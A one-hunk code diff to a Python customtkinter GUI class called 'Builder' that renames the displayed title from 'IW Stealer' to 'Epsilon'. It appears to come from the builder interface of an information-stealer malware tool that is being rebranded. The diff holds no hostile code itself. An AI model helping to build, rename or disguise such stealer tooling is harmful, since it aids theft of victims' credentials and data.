@@ -770,7 +770,7 @@ class Builder(ctk.CTk):
 		self.columnconfigure(0, weight= 1)
 		self.columnconfigure(1, weight= 0)
 
-		self.titleLabel = ctk.CTkLabel(self, text= "IW Stealer", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#c20c0c")
+		self.titleLabel = ctk.CTkLabel(self, text= "Epsilon", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#c20c0c")
 		self.titleLabel.grid(row= 0, column= 0)
 
 		self.builderOptions = BuilderOptionsFrame(self)
